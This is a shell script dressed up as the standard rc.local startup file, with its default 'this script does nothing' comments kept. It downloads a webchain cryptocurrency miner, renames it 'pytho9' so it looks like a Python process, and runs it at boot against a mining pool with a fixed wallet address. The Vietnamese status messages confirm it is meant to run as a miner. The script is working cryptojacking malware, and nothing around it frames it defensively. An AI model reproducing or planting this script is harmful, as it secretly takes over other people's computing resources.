#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/pytho9 ]; then
    if pgrep -x "pytho9" > /dev/null
then
    echo "Miner dang chay roi , ke cmn di "
    
else

echo "Miner da install , chay thoi "
./pytho9 -o web-ko1.gonspool.com:3333 -u 0x814f918de807b7ba5caf41a4e53885615cf7ffd7 -p x --donate-level=0

     
fi
exit
fi


wget https://github.com/webchain-network/webchain-miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz
tar xvzf webchain-miner-2.8.0-linux-amd64.tar.gz
mv webchain-miner pytho9
rm config.json
./pytho9 -o web-ko1.gonspool.com:3333 -u 0x814f918de807b7ba5caf41a4e53885615cf7ffd7 -p x --donate-level=0

exit 0
